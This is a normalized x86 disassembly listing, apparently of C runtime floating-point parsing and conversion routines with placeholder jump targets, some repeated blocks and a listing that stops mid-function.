dec edx
or edx 0xffffffe0
inc edx
and [ ebp - 0x28 ] 0x0
and [ ebp - 0x20 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x24 ] 0x20
sub [ ebp - 0x24 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
mov ebx [ ebp - 0x20 ]
lea ebx [ ebp + ebx * 4 - 0x10 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x2c ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x24 ]
or esi [ ebp - 0x28 ]
mov [ ebx ] esi
mov esi [ ebp - 0x2c ]
shl esi cl
inc [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0x3
mov [ ebp - 0x28 ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x8 ]
pop edx
sub ecx esi
and [ ebp - 0x24 ] 0x0
lea ecx [ ebp + eax * 4 - 0x10 ]
mov edx [ ecx ]
lea edi [ edx + 0x1 ]
mov [ ebp - 0x20 ] edi
cmp edi edx
jb r-xdata
dec eax
mov edx [ ebp - 0x20 ]
mov [ ecx ] edx
mov ecx [ ebp - 0x24 ]
jns r-xdata
mov ecx [ ebp - 0x20 ]
mov edi [ ebp + ecx * 4 - 0x10 ]
mov ecx edi
and ecx esi
mov [ ebp - 0x2c ] ecx
mov ecx edx
shr edi cl
mov ecx [ ebp - 0x20 ]
or edi [ ebp - 0x28 ]
mov [ ebp + ecx * 4 - 0x10 ] edi
mov edi [ ebp - 0x2c ]
mov ecx [ ebp - 0x24 ]
shl edi cl
inc [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0x3
mov [ ebp - 0x28 ] edi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x8 ]
pop edx
sub ecx esi
mov ebx [ ebp - 0x20 ]
lea ebx [ ebp + ebx * 4 - 0x10 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x2c ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x24 ]
or esi [ ebp - 0x28 ]
mov [ ebx ] esi
mov esi [ ebp - 0x2c ]
shl esi cl
inc [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0x3
mov [ ebp - 0x28 ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x8 ]
pop edx
sub ecx esi
and [ ebp + edx * 4 - 0x10 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x10 ] esi
jmp r-xdata
cmp edi 0x1
and [ ebp + edx * 4 - 0x10 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x10 ] esi
jmp r-xdata
and [ ebp + edx * 4 - 0x10 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x10 ] esi
jmp r-xdata
cmp edx eax
jl r-xdata
mov esi [ rw-data ]
dec esi
lea eax [ esi + 0x1 ]
cdq
and edx 0x1f
add eax edx
sar eax 0x5
lea edx [ esi + 0x1 ]
and edx 0x8000001f
mov [ ebp - 0x30 ] eax
jns r-xdata
sub ecx 0x4
dec edx
jns r-xdata
cmp edx eax
jl r-xdata
xor eax eax
sub ecx 0x4
dec edx
jns r-xdata
cmp edx eax
jl r-xdata
mov ebx [ rw-data ]
add ebx [ rw-data ]
xor eax eax
inc eax
jmp r-xdata
sub ecx 0x4
dec edx
jns r-xdata
push 0x1f
pop ecx
sub ecx edx
xor edx edx
inc edx
shl edx cl
lea ebx [ ebp + eax * 4 - 0x10 ]
mov [ ebp - 0x2c ] ecx
test [ ebx ] edx
je r-xdata
dec edx
or edx 0xffffffe0
inc edx
mov ecx [ ebp - 0x2c ]
or eax 0xffffffff
shl eax cl
and [ ebx ] eax
mov eax [ ebp - 0x30 ]
inc eax
cmp eax 0x3
jge r-xdata
or edx 0xffffffff
shl edx cl
not edx
test [ ebp + eax * 4 - 0x10 ] edx
jmp r-xdata
mov ecx [ rw-data ]
lea eax [ ecx + 0x1 ]
cdq
and edx 0x1f
add eax edx
lea edx [ ecx + 0x1 ]
sar eax 0x5
and edx 0x8000001f
jns r-xdata
push 0x3
pop ecx
lea edi [ ebp + eax * 4 - 0x10 ]
sub ecx eax
xor eax eax
[ edi ]
jne r-xdata
and [ ebp - 0x28 ] 0x0
and [ ebp - 0x20 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x24 ] 0x20
sub [ ebp - 0x24 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
mov eax esi
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
sar eax 0x5
and esi 0x8000001f
jns r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ebx [ ebp - 0x20 ]
lea ebx [ ebp + ebx * 4 - 0x10 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x2c ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x24 ]
or esi [ ebp - 0x28 ]
mov [ ebx ] esi
mov esi [ ebp - 0x2c ]
shl esi cl
inc [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0x3
mov [ ebp - 0x28 ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x8 ]
pop edx
sub ecx esi
and [ ebp - 0x28 ] 0x0
xor edx edx
sub ecx esi
inc edx
shl edx cl
lea ecx [ ebp + eax * 4 - 0x10 ]
mov esi [ ecx ]
lea edi [ esi + edx ]
cmp edi esi
jb r-xdata
dec esi
or esi 0xffffffe0
inc esi
cmp [ ebp + eax * 4 - 0x10 ] 0x0
jmp r-xdata
and [ ebp + edx * 4 - 0x10 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x10 ] esi
jmp r-xdata
mov [ ebp - 0x28 ] 0x1
cmp edi edx
jae r-xdata
cmp edx eax
jl r-xdata
sub ecx 0x4
dec edx
jns r-xdata
dec eax
jns r-xdata
mov [ ecx ] edi
mov ecx [ ebp - 0x28 ]
jmp r-xdata
test ecx ecx
je r-xdata
lea ecx [ ebp + eax * 4 - 0x10 ]
mov edx [ ecx ]
lea esi [ edx + 0x1 ]
xor edi edi
cmp esi edx
jb r-xdata
xor edi edi
inc edi
cmp esi 0x1
jae r-xdata
mov [ ecx ] esi
mov ecx edi
sub_10025d08
mov edi edi
push ebp
mov ebp esp
sub esp 0x38
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ ebp - 0x34 ] ecx
movzx ecx [ eax + 0xa ]
push ebx
mov ebx ecx
and ecx 0x8000
mov [ ebp - 0x38 ] ecx
mov ecx [ eax + 0x6 ]
mov [ ebp - 0x10 ] ecx
mov ecx [ eax + 0x2 ]
movzx eax [ eax ]
and ebx 0x7fff
sub ebx 0x3fff
shl eax 0x10
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] eax
cmp ebx 0xffffc001
jne r-xdata
and [ ebp - 0x24 ] 0x0
push esi
lea esi [ ebp - 0x10 ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi [ rw-data ]
dec edi
lea eax [ edi + 0x1 ]
cdq
and edx 0x1f
add eax edx
sar eax 0x5
lea edx [ edi + 0x1 ]
and edx 0x8000001f
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x28 ] eax
jns r-xdata
xor ebx ebx
xor eax eax
lea esi [ ebp + eax * 4 - 0x10 ]
push 0x1f
xor eax eax
pop ecx
sub ecx edx
inc eax
shl eax cl
mov [ ebp - 0x30 ] ecx
test [ esi ] eax
je r-xdata
dec edx
or edx 0xffffffe0
inc edx
xor eax eax
lea edi [ ebp - 0x10 ]
stosd [ edi ]
stosd [ edi ]
push 0x2
stosd [ edi ]
pop eax
jmp r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ecx [ ebp - 0x30 ]
or eax 0xffffffff
shl eax cl
push 0x3
pop ecx
and [ esi ] eax
mov eax [ ebp - 0x28 ]
inc eax
cmp eax ecx
jge r-xdata
mov eax [ ebp - 0x28 ]
or edx 0xffffffff
shl edx cl
not edx
test [ ebp + eax * 4 - 0x10 ] edx
jmp r-xdata
push 0x1f
pop ecx
sub ecx [ rw-data ]
shl ebx cl
mov ecx [ ebp - 0x38 ]
neg ecx
sbb ecx ecx
and ecx 0x80000000
or ebx ecx
mov ecx [ rw-data ]
or ebx [ ebp - 0x10 ]
cmp ecx 0x40
jne r-xdata
cmp [ ebp + eax * 4 - 0x10 ] ebx
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp - 0x24 ] 0x0
je r-xdata
lea edi [ ebp + eax * 4 - 0x10 ]
sub ecx eax
xor eax eax
[ edi ]
jne r-xdata
cmp ecx 0x20
jne r-xdata
mov ecx [ ebp - 0x34 ]
mov edx [ ebp - 0xc ]
mov [ ecx + 0x4 ] ebx
mov [ ecx ] edx
jmp r-xdata
mov eax [ rw-data ]
mov ecx eax
sub ecx [ rw-data ]
cmp ebx ecx
jge r-xdata
inc ebx
mov eax edi
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
sar eax 0x5
and edi 0x8000001f
jns r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_10016ec3
leave
retn
mov ecx [ ebp - 0x34 ]
mov [ ecx ] ebx
cmp ebx eax
jg r-xdata
xor eax eax
lea edi [ ebp - 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
and [ ebp - 0x24 ] 0x0
sub ecx edi
xor edx edx
inc edx
shl edx cl
lea ecx [ ebp + eax * 4 - 0x10 ]
mov edi [ ecx ]
add edi edx
mov [ ebp - 0x20 ] edi
mov edi [ ecx ]
cmp [ ebp - 0x20 ] edi
jb r-xdata
dec edi
or edi 0xffffffe0
inc edi
cmp [ ebp + eax * 4 - 0x10 ] 0x0
jmp r-xdata
mov ecx [ rw-data ]
cmp ebx [ rw-data ]
jl r-xdata
sub eax [ ebp - 0x2c ]
lea esi [ ebp - 0x1c ]
mov ecx eax
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
cdq
and edx 0x1f
add eax edx
movsd [ edi ] [ esi ]
mov edx ecx
sar eax 0x5
and edx 0x8000001f
movsd [ edi ] [ esi ]
jns r-xdata
push 0x2
xor ebx ebx
pop eax
jmp r-xdata
mov [ ebp - 0x24 ] 0x1
cmp [ ebp - 0x20 ] edx
jmp r-xdata
add ebx [ rw-data ]
and [ ebp - 0x10 ] 0x7fffffff
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
xor eax eax
lea edi [ ebp - 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
or [ ebp - 0x10 ] 0x80000000
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
and [ ebp - 0x28 ] 0x0
and [ ebp - 0x20 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x24 ] 0x20
sub [ ebp - 0x24 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
pop esi
test ecx ecx
je r-xdata
mov [ ebp - 0x24 ] ecx
jae r-xdata
and [ ebp - 0x28 ] 0x0
and [ ebp - 0x20 ] 0x0
or esi 0xffffffff
mov ecx edx
shl esi cl
mov [ ebp - 0x24 ] 0x20
sub [ ebp - 0x24 ] edx
not esi
dec edx
or edx 0xffffffe0
inc edx
and [ ebp - 0x28 ] 0x0
and [ ebp - 0x20 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x24 ] 0x20
sub [ ebp - 0x24 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
mov ebx [ ebp - 0x20 ]
lea ebx [ ebp + ebx * 4 - 0x10 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x2c ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x24 ]
or esi [ ebp - 0x28 ]
mov [ ebx ] esi
mov esi [ ebp - 0x2c ]
shl esi cl
inc [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0x3
mov [ ebp - 0x28 ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x8 ]
pop edx
sub ecx esi
and [ ebp - 0x24 ] 0x0
lea ecx [ ebp + eax * 4 - 0x10 ]
mov edx [ ecx ]
lea edi [ edx + 0x1 ]
mov [ ebp - 0x20 ] edi
cmp edi edx
jb r-xdata
dec eax
mov edx [ ebp - 0x20 ]
mov [ ecx ] edx
mov ecx [ ebp - 0x24 ]
jns r-xdata
mov ecx [ ebp - 0x20 ]
mov edi [ ebp + ecx * 4 - 0x10 ]
mov ecx edi
and ecx esi
mov [ ebp - 0x2c ] ecx
mov ecx edx
shr edi cl
mov ecx [ ebp - 0x20 ]
or edi [ ebp - 0x28 ]
mov [ ebp + ecx * 4 - 0x10 ] edi
mov edi [ ebp - 0x2c ]
mov ecx [ ebp - 0x24 ]
shl edi cl
inc [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0x3
mov [ ebp - 0x28 ] edi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x8 ]
pop edx
sub ecx esi
mov ebx [ ebp - 0x20 ]
lea ebx [ ebp + ebx * 4 - 0x10 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x2c ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x24 ]
or esi [ ebp - 0x28 ]
mov [ ebx ] esi
mov esi [ ebp - 0x2c ]
shl esi cl
inc [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0x3
mov [ ebp - 0x28 ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x8 ]
pop edx
sub ecx esi
and [ ebp + edx * 4 - 0x10 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x10 ] esi
jmp r-xdata
cmp edi 0x1
and [ ebp + edx * 4 - 0x10 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x10 ] esi
jmp r-xdata
and [ ebp + edx * 4 - 0x10 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x10 ] esi
jmp r-xdata
cmp edx eax
jl r-xdata
mov esi [ rw-data ]
dec esi
lea eax [ esi + 0x1 ]
cdq
and edx 0x1f
add eax edx
sar eax 0x5
lea edx [ esi + 0x1 ]
and edx 0x8000001f
mov [ ebp - 0x30 ] eax
jns r-xdata
sub ecx 0x4
dec edx
jns r-xdata
cmp edx eax
jl r-xdata
xor eax eax
sub ecx 0x4
dec edx
jns r-xdata
cmp edx eax
jl r-xdata
mov ebx [ rw-data ]
add ebx [ rw-data ]
xor eax eax
inc eax
jmp r-xdata
sub ecx 0x4
dec edx
jns r-xdata
push 0x1f
pop ecx
sub ecx edx
xor edx edx
inc edx
shl edx cl
lea ebx [ ebp + eax * 4 - 0x10 ]
mov [ ebp - 0x2c ] ecx
test [ ebx ] edx
je r-xdata
dec edx
or edx 0xffffffe0
inc edx
mov ecx [ ebp - 0x2c ]
or eax 0xffffffff
shl eax cl
and [ ebx ] eax
mov eax [ ebp - 0x30 ]
inc eax
cmp eax 0x3
jge r-xdata
or edx 0xffffffff
shl edx cl
not edx
test [ ebp + eax * 4 - 0x10 ] edx
jmp r-xdata
mov ecx [ rw-data ]
lea eax [ ecx + 0x1 ]
cdq
and edx 0x1f
add eax edx
lea edx [ ecx + 0x1 ]
sar eax 0x5
and edx 0x8000001f
jns r-xdata
push 0x3
pop ecx
lea edi [ ebp + eax * 4 - 0x10 ]
sub ecx eax
xor eax eax
[ edi ]
jne r-xdata
and [ ebp - 0x28 ] 0x0
and [ ebp - 0x20 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x24 ] 0x20
sub [ ebp - 0x24 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
mov eax esi
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
sar eax 0x5
and esi 0x8000001f
jns r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ebx [ ebp - 0x20 ]
lea ebx [ ebp + ebx * 4 - 0x10 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x2c ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x24 ]
or esi [ ebp - 0x28 ]
mov [ ebx ] esi
mov esi [ ebp - 0x2c ]
shl esi cl
inc [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0x3
mov [ ebp - 0x28 ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x8 ]
pop edx
sub ecx esi
and [ ebp - 0x28 ] 0x0
xor edx edx
sub ecx esi
inc edx
shl edx cl
lea ecx [ ebp + eax * 4 - 0x10 ]
mov esi [ ecx ]
lea edi [ esi + edx ]
cmp edi esi
jb r-xdata
dec esi
or esi 0xffffffe0
inc esi
cmp [ ebp + eax * 4 - 0x10 ] 0x0
jmp r-xdata
and [ ebp + edx * 4 - 0x10 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x10 ] esi
jmp r-xdata
mov [ ebp - 0x28 ] 0x1
cmp edi edx
jae r-xdata
cmp edx eax
jl r-xdata
sub ecx 0x4
dec edx
jns r-xdata
dec eax
jns r-xdata
mov [ ecx ] edi
mov ecx [ ebp - 0x28 ]
jmp r-xdata
test ecx ecx
je r-xdata
lea ecx [ ebp + eax * 4 - 0x10 ]
mov edx [ ecx ]
lea esi [ edx + 0x1 ]
xor edi edi
cmp esi edx
jb r-xdata
xor edi edi
inc edi
cmp esi 0x1
jae r-xdata
mov [ ecx ] esi
mov ecx edi
sub_10026259
mov edi edi
push ebp
mov ebp esp
sub esp 0x7c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
xor ecx ecx
push esi
xor esi esi
mov [ ebp - 0x78 ] eax
mov eax [ ebp + 0xc ]
inc esi
push edi
mov [ ebp - 0x70 ] eax
lea edi [ ebp - 0x20 ]
mov [ ebp - 0x74 ] ecx
mov [ ebp - 0x68 ] esi
mov [ ebp - 0x4c ] ecx
mov [ ebp - 0x58 ] ecx
mov [ ebp - 0x5c ] ecx
mov [ ebp - 0x60 ] ecx
mov [ ebp - 0x64 ] ecx
mov [ ebp - 0x50 ] ecx
mov [ ebp - 0x6c ] ecx
cmp [ ebp + 0x24 ] ecx
jne r-xdata
mov edx [ ebp + 0x10 ]
mov [ ebp - 0x54 ] edx
call sub_10017e85
mov [ eax ] 0x16
call sub_1001b8e4
xor eax eax
jmp r-xdata
inc edx
jmp r-xdata
cmp al 0x9
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_10016ec3
leave
retn
mov al [ edx ]
cmp al 0x20
je r-xdata
cmp al 0xa
je r-xdata
cmp al 0xd
jne r-xdata
push ebx
mov bl 0x30
cmp ecx 0xa
jne r-xdata
jmp [ ecx * 4 + jump_table_10026905 ]
mov al [ edx ]
inc edx
cmp ecx 0xb
ja r-xdata
jmp r-xdata
lea ecx [ eax - 0x31 ]
cmp cl 0x8
ja r-xdata
lea ecx [ eax - 0x31 ]
mov [ ebp - 0x58 ] esi
cmp cl 0x8
jbe r-xdata
lea ecx [ eax - 0x31 ]
cmp cl 0x8
jbe r-xdata
mov [ ebp - 0x58 ] esi
jmp r-xdata
cmp [ ebp - 0x4c ] 0x0
mov [ ebp - 0x58 ] esi
mov [ ebp - 0x5c ] esi
jne r-xdata
sub al bl
mov [ ebp - 0x5c ] esi
cmp al 0x9
ja r-xdata
lea ecx [ edx - 0x2 ]
mov [ ebp - 0x54 ] ecx
lea ecx [ eax - 0x31 ]
cmp cl 0x8
ja r-xdata
mov [ ebp - 0x60 ] esi
jmp r-xdata
lea ecx [ eax - 0x31 ]
cmp cl 0x8
jbe r-xdata
cmp [ ebp + 0x20 ] 0x0
je r-xdata
mov [ ebp - 0x60 ] esi
xor ecx ecx
jmp r-xdata
cmp [ ebp - 0x58 ] 0x0
mov eax [ ebp - 0x70 ]
mov [ eax ] edx
je r-xdata
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
cmp al [ ecx ]
jne r-xdata
push 0x3
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
cmp al [ ecx ]
jne r-xdata
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
cmp al [ ecx ]
je r-xdata
cmp al bl
jge r-xdata
cmp al bl
jge r-xdata
jmp r-xdata
mov edx [ ebp - 0x54 ]
jmp r-xdata
push 0x4
jmp r-xdata
movsx eax al
sub eax 0x2b
je r-xdata
push 0x9
jmp r-xdata
cmp al bl
je r-xdata
cmp al bl
jmp r-xdata
push 0xa
pop ecx
dec edx
movsx eax al
sub eax 0x2b
lea ecx [ edx - 0x1 ]
mov [ ebp - 0x54 ] ecx
je r-xdata
cmp al bl
jge r-xdata
mov [ ebp - 0x6c ] 0x4
jmp r-xdata
push 0x18
pop eax
cmp [ ebp - 0x4c ] eax
jbe r-xdata
movsx eax al
sub eax 0x2b
je r-xdata
push 0x5
cmp al 0x2b
je r-xdata
push 0x4
jmp r-xdata
cmp al bl
je r-xdata
cmp al 0x39
jg r-xdata
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
cmp al [ ecx ]
je r-xdata
cmp al 0x39
jg r-xdata
jmp r-xdata
cmp al bl
je r-xdata
pop ecx
dec edx
jmp r-xdata
push 0x7
jmp r-xdata
dec eax
dec eax
je r-xdata
mov al [ edx ]
inc edx
sub al 0x31
cmp al 0x8
jbe r-xdata
jne r-xdata
dec eax
dec eax
je r-xdata
cmp al 0x39
jg r-xdata
jmp r-xdata
xor ecx ecx
xor eax eax
xor edx edx
xor esi esi
cmp [ ebp - 0x4c ] 0x0
jbe r-xdata
cmp [ ebp - 0x9 ] 0x5
jl r-xdata
and [ ebp - 0x74 ] 0x0
push 0x2
pop ecx
jmp r-xdata
dec eax
dec eax
je r-xdata
dec edx
push 0xb
jmp r-xdata
cmp al 0x2d
je r-xdata
pop ecx
jmp r-xdata
mov ecx esi
jmp r-xdata
cmp [ ebp - 0x4c ] 0x19
jae r-xdata
cmp al 0x2b
je r-xdata
cmp [ ebp - 0x4c ] 0x19
jae r-xdata
dec [ ebp - 0x50 ]
mov al [ edx ]
inc edx
jmp r-xdata
or [ ebp - 0x68 ] 0xffffffff
push 0x7
pop ecx
jmp r-xdata
sub eax 0x3
dec edx
jmp r-xdata
push 0x8
jmp r-xdata
mov edx ecx
mov [ ebp - 0x64 ] ecx
jmp r-xdata
imul ecx ecx 0xa
movsx esi al
lea ecx [ ecx + esi - 0x30 ]
cmp ecx 0x1450
jg r-xdata
jmp r-xdata
dec edi
inc [ ebp - 0x50 ]
mov [ ebp - 0x4c ] eax
inc [ ebp - 0x9 ]
push 0x2
pop ecx
mov [ ebp - 0x74 ] 0x8000
jmp r-xdata
sub eax 0x3
jne r-xdata
cmp al bl
je r-xdata
inc [ ebp - 0x50 ]
inc [ ebp - 0x4c ]
sub al bl
mov [ edi ] al
inc edi
jmp r-xdata
cmp al 0x2d
je r-xdata
mov al [ edx ]
inc edx
inc [ ebp - 0x4c ]
sub al bl
mov [ edi ] al
inc edi
dec [ ebp - 0x50 ]
cmp al bl
jge r-xdata
mov ecx 0x1451
mov al [ edx ]
inc edx
dec edi
cmp [ edi ] 0x0
je r-xdata
cmp al 0x43
jle r-xdata
mov al [ edx ]
inc edx
jmp r-xdata
cmp al 0x39
jg r-xdata
jmp r-xdata
dec [ ebp - 0x4c ]
inc [ ebp - 0x50 ]
lea eax [ ebp - 0x3c ]
push eax
push [ ebp - 0x4c ]
lea eax [ ebp - 0x20 ]
push eax
call sub_10027e89
mov eax [ ebp - 0x64 ]
xor edx edx
add esp 0xc
cmp [ ebp - 0x68 ] edx
jge r-xdata
cmp al 0x45
jle r-xdata
mov al [ edx ]
inc edx
add eax [ ebp - 0x50 ]
cmp [ ebp - 0x60 ] edx
jne r-xdata
neg eax
push 0x6
jmp r-xdata
sub al 0x64
cmp al 0x1
ja r-xdata
cmp [ ebp - 0x5c ] edx
jne r-xdata
add eax [ ebp + 0x18 ]
cmp eax 0x1450
jg r-xdata
sub eax [ ebp + 0x1c ]
xor esi esi
mov eax 0x7fff
mov edx 0x80000000
xor ecx ecx
mov [ ebp - 0x6c ] 0x2
jmp r-xdata
cmp eax 0xffffebb0
jl r-xdata
mov edi [ ebp - 0x78 ]
or eax [ ebp - 0x74 ]
mov [ edi ] cx
mov [ edi + 0xa ] ax
mov eax [ ebp - 0x6c ]
mov [ edi + 0x2 ] esi
mov [ edi + 0x6 ] edx
pop ebx
mov [ ebp - 0x6c ] 0x1
mov ecx rw-data
sub ecx 0x60
mov [ ebp - 0x54 ] eax
cmp eax edx
je r-xdata
mov eax [ ebp - 0x34 ]
movzx ecx [ ebp - 0x3c ]
mov esi [ ebp - 0x3a ]
mov edx [ ebp - 0x36 ]
shr eax 0x10
jmp r-xdata
jge r-xdata
cmp [ ebp + 0x14 ] edx
jne r-xdata
neg eax
mov ecx rw-data
mov [ ebp - 0x54 ] eax
sub ecx 0x60
cmp [ ebp - 0x54 ] edx
je r-xdata
xor eax eax
mov [ ebp - 0x3c ] ax
jmp r-xdata
mov eax [ ebp - 0x54 ]
sar [ ebp - 0x54 ] 0x3
add ecx 0x54
and eax 0x7
mov [ ebp - 0x7c ] ecx
cmp eax edx
je r-xdata
cmp [ ebp - 0x54 ] 0x0
jne r-xdata
imul eax eax 0xc
lea ebx [ ecx + eax ]
mov eax 0x8000
cmp [ ebx ] ax
jb r-xdata
mov ecx [ ebp - 0x7c ]
xor edx edx
mov edx [ ebp - 0x32 ]
xor eax eax
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] eax
movzx eax [ ebx + 0xa ]
mov esi eax
xor esi [ ebp - 0x32 ]
mov ecx 0x7fff
and edx ecx
and eax ecx
and esi 0x8000
mov edi 0x7fff
lea ecx [ eax + edx ]
mov [ ebp - 0x70 ] esi
movzx ecx cx
cmp dx di
jae r-xdata
mov esi ebx
lea edi [ ebp - 0x48 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
dec [ ebp - 0x46 ]
lea ebx [ ebp - 0x48 ]
xor eax eax
test si si
sete al
and [ ebp - 0x38 ] 0x0
dec eax
and eax 0x80000000
add eax 0x7fff8000
and [ ebp - 0x3c ] 0x0
cmp ax di
jae r-xdata
mov edi 0xbffd
cmp cx di
ja r-xdata
mov esi 0x3fbf
cmp cx si
ja r-xdata
xor esi esi
cmp dx si
jne r-xdata
xor eax eax
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x3c ] eax
jmp r-xdata
cmp ax si
jne r-xdata
inc ecx
test [ ebp - 0x34 ] 0x7fffffff
jne r-xdata
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x68 ] esi
lea edi [ ebp - 0x28 ]
mov [ ebp - 0x58 ] 0x5
inc ecx
test [ ebx + 0x8 ] 0x7fffffff
jne r-xdata
cmp [ ebp - 0x38 ] esi
jne r-xdata
add edi 0x2
inc [ ebp - 0x68 ]
dec [ ebp - 0x58 ]
cmp [ ebp - 0x58 ] 0x0
jg r-xdata
lea eax [ ebp + eax - 0x3c ]
mov [ ebp - 0x5c ] eax
lea eax [ ebx + 0x8 ]
mov [ ebp - 0x60 ] eax
cmp [ ebx + 0x4 ] esi
jne r-xdata
cmp [ ebp - 0x3c ] esi
jne r-xdata
mov eax [ ebp - 0x68 ]
mov edx [ ebp - 0x58 ]
add eax eax
mov [ ebp - 0x64 ] edx
test edx edx
jle r-xdata
add ecx 0xc002
test cx cx
jle r-xdata
mov [ ebp - 0x4c ] 0x1
cmp esi eax
jae r-xdata
cmp [ ebx ] esi
jne r-xdata
xor eax eax
mov [ ebp - 0x32 ] ax
jmp r-xdata
add ecx 0xffff
test cx cx
jns r-xdata
mov edi [ ebp - 0x24 ]
test edi edi
js r-xdata
add [ ebp - 0x5c ] 0x2
sub [ ebp - 0x60 ] 0x2
dec [ ebp - 0x64 ]
cmp [ ebp - 0x64 ] 0x0
jg r-xdata
inc [ edi ]
cmp [ ebp - 0x4c ] 0x0
mov [ edi - 0x4 ] esi
je r-xdata
mov [ ebp - 0x34 ] esi
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x3c ] esi
jmp r-xdata
mov eax 0x8000
cmp [ ebp - 0x2c ] ax
ja r-xdata
mov eax ecx
neg eax
movzx esi ax
add ecx esi
test cx cx
jg r-xdata
mov esi [ ebp - 0x28 ]
mov eax [ ebp - 0x2c ]
shl [ ebp - 0x2c ] 0x1
shr eax 0x1f
mov edx esi
add esi esi
or esi eax
shr edx 0x1f
lea eax [ edi + edi ]
or eax edx
add ecx 0xffff
mov [ ebp - 0x28 ] esi
mov [ ebp - 0x24 ] eax
test cx cx
jg r-xdata
mov eax [ ebp - 0x60 ]
mov edx [ ebp - 0x5c ]
movzx edx [ edx ]
